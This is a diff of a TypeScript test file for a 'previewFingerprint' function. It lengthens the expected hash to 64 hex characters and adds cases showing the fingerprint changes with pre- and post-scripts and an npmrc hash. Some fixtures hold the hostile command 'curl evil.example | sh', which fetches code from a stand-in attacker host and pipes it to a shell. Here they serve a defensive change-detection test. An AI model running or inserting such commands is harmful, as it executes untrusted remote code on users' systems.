@@ -187,7 +187,7 @@ describe("previewFingerprint", () => {
     expect(previewFingerprint(base)).toBe(
       previewFingerprint({ ...base, env: { B: "2", A: "1" } }),
     );
-    expect(previewFingerprint(base)).toMatch(/^[0-9a-f]{14}$/);
+    expect(previewFingerprint(base)).toMatch(/^[0-9a-f]{64}$/);
   });
 
   it("changes when anything that decides what runs changes", () => {
@@ -200,6 +200,9 @@ describe("previewFingerprint", () => {
       { ...base, scriptBody: "vite && curl evil.example | sh" },
       { ...base, port: 1234 },
       { ...base, autoPort: true },
+      { ...base, preScript: "curl evil.example | sh" },
+      { ...base, postScript: "true" },
+      { ...base, npmrcHash: "0".repeat(64) },
     ])
       expect(previewFingerprint(changed)).not.toBe(print);
   });
